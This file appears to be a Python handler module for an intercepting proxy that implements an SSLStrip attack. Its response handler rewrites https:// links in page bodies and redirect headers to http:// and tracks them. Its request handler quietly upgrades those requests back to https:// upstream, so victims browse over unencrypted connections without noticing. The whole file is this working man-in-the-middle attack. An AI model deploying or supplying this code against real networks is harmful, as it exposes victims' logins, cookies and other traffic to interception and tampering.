# -*- coding: utf-8 -*-
from collections import deque
import re

class ProxyHandler:
    replaced_urls = deque(maxlen=1024)

    def __init__(self, logger, params, proxyOptions):
        self.logger = logger
        self.proxyOptions = proxyOptions
        logger.info('hello world from __init__ in SSLStrip ProxyHandler')

    def request_handler(self, req, req_body):
        if req.path in self.replaced_urls:
            req.path = req.path.replace('http://', 'https://')

    def response_handler(self, req, req_body, res, res_body):
        def replacefunc(m):
            http_url = "http://" + m.group(1)
            self.replaced_urls.append(http_url)
            return http_url

        re_https_url = r"https://([-_.!~*'()a-zA-Z0-9;/?:@&=+$,%]+)"

        if 'Location' in res.headers:
            res.headers['Location'] = re.sub(re_https_url, replacefunc, res.headers['Location'])
        return re.sub(re_https_url, replacefunc, res_body)

